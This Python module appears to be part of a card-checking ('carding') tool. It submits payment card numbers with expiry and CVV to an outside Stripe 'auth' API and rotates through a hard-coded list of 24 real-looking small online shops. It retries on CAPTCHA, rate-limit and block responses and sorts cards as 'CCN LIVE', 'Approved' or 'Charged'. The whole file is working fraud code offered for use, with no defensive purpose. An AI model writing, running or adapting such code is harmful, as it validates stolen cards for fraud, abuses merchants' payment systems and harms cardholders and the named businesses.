"""
Stripe Auth API Handler
Uses external API for Stripe authentication checks with site rotation.
"""

import httpx
import asyncio
import random
from typing import Dict, Optional, Tuple

# Stripe Auth API endpoint
API_URL = "https://dclub.site/apis/stripe/auth/st7.php"

# Working sites for Stripe Auth
STRIPE_AUTH_SITES = [
    "shop-caymans.com",
    "shop.conequipmentparts.com",
    "sababa-shop.com",
    "mjuniqueclosets.com",
    "dutchwaregear.com",
    "nielladiverse.com",
    "grabpick.com",
    "dominileather.com",
    "theneomag.com",
    "bdmanja.com",
    "shop.littlefeetdenver.com",
    "zoe-hermsen.com",
    "saadaintl.com",
    "sockbox.com",
    "exquisitebeds.com",
    "girlslivingwell.com",
    "shop.wattlogic.com",
    "clinetix-xvps.temp-dns.com",
    "courtneyreckord.com",
    "beatrizpalacios.com",
    "peeteescollection.com",
    "2poundstreet.com",
    "prettyplainpaper.com",
    "lolaandveranda.com",
]

MAX_RETRIES = 3


def get_random_site() -> str:
    """Get a random site from the list."""
    return random.choice(STRIPE_AUTH_SITES)


async def check_stripe_auth(card: str, site: Optional[str] = None, timeout: int = 60) -> Dict:
    """
    Check a card using the Stripe Auth API.
    
    Args:
        card: Card in format cc|mm|yy|cvv
        site: Optional specific site to use (defaults to random)
        timeout: Request timeout in seconds
        
    Returns:
        Dict with keys: response, status, message, success
    """
    result = {
        "response": "UNKNOWN",
        "status": "Error",
        "message": "Unknown error",
        "success": False,
        "site": None
    }
    
    if not site:
        site = get_random_site()
    
    result["site"] = site
    
    try:
        url = f"{API_URL}?site={site}&cc={card}"
        
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
            response = await client.get(url)
        
        if response.status_code != 200:
            result["message"] = f"HTTP {response.status_code}"
            return result
        
        # Parse JSON response
        try:
            data = response.json()
            
            api_response = data.get("response", "UNKNOWN")
            api_status = data.get("status", "Error")
            api_message = data.get("message", "Unknown")
            
            result["response"] = api_response
            result["status"] = api_status
            result["message"] = api_message
            
            # Determine success based on status
            status_upper = api_status.upper() if api_status else ""
            response_upper = api_response.upper() if api_response else ""
            message_upper = api_message.upper() if api_message else ""
            
            # Check for approved/live
            if any(x in status_upper for x in ["APPROVED", "LIVE", "SUCCESS", "CHARGED"]):
                result["success"] = True
            elif any(x in response_upper for x in ["APPROVED", "LIVE", "CCN", "3DS", "AUTHENTICATION"]):
                result["success"] = True
            elif any(x in message_upper for x in ["APPROVED", "LIVE", "AUTHENTICATED"]):
                result["success"] = True
            
            return result
            
        except Exception as e:
            result["message"] = f"JSON Error: {str(e)[:30]}"
            return result
            
    except httpx.TimeoutException:
        result["message"] = "Request Timeout"
        return result
    except httpx.ConnectError:
        result["message"] = "Connection Error"
        return result
    except Exception as e:
        result["message"] = f"Error: {str(e)[:40]}"
        return result


async def check_stripe_auth_with_retry(card: str, max_retries: int = MAX_RETRIES) -> Tuple[Dict, int]:
    """
    Check a card with retry logic using different sites.
    
    Returns:
        Tuple of (result_dict, retry_count)
    """
    tried_sites = set()
    retry_count = 0
    last_result = None
    
    while retry_count < max_retries:
        # Get a random site we haven't tried
        available_sites = [s for s in STRIPE_AUTH_SITES if s not in tried_sites]
        if not available_sites:
            available_sites = STRIPE_AUTH_SITES  # Reset if all tried
        
        site = random.choice(available_sites)
        tried_sites.add(site)
        
        result = await check_stripe_auth(card, site)
        last_result = result
        
        # Check if we should retry
        message_upper = result.get("message", "").upper()
        response_upper = result.get("response", "").upper()
        
        # Retry on these errors
        should_retry = any(x in message_upper or x in response_upper for x in [
            "TIMEOUT", "CONNECTION", "ERROR", "CAPTCHA", "RATE",
            "BLOCKED", "EMPTY", "INVALID"
        ])
        
        if not should_retry:
            return result, retry_count
        
        retry_count += 1
        if retry_count < max_retries:
            await asyncio.sleep(0.5)
    
    return last_result or {"response": "MAX_RETRIES", "status": "Error", "message": "All retries failed", "success": False}, retry_count


def determine_status(result: Dict) -> Tuple[str, str, bool]:
    """
    Determine status from API result.
    
    Returns:
        Tuple of (status_text, header, is_live)
    """
    response = str(result.get("response", "")).upper()
    status = str(result.get("status", "")).upper()
    message = str(result.get("message", "")).upper()
    
    combined = f"{response} {status} {message}"
    
    # Charged/Success
    if any(x in combined for x in ["CHARGED", "SUCCESS", "ORDER", "THANK"]):
        return "Charged 💎", "CHARGED", True
    
    # Approved/Live (CCN)
    if any(x in combined for x in [
        "APPROVED", "LIVE", "CCN", "3DS", "AUTHENTICATION", "CVC", "CVV",
        "INCORRECT_CVC", "INCORRECT_ZIP", "INSUFFICIENT"
    ]):
        return "Approved ✅", "CCN LIVE", True
    
    # Error
    if any(x in combined for x in [
        "ERROR", "TIMEOUT", "CONNECTION", "CAPTCHA", "BLOCKED", "RATE"
    ]):
        return "Error ⚠️", "ERROR", False
    
    # Declined
    if any(x in combined for x in [
        "DECLINED", "DECLINE", "REJECTED", "INVALID", "EXPIRED",
        "LOST", "STOLEN", "FRAUD", "RESTRICTED"
    ]):
        return "Declined ❌", "DECLINED", False
    
    # Default
    return "Declined ❌", "DECLINED", False
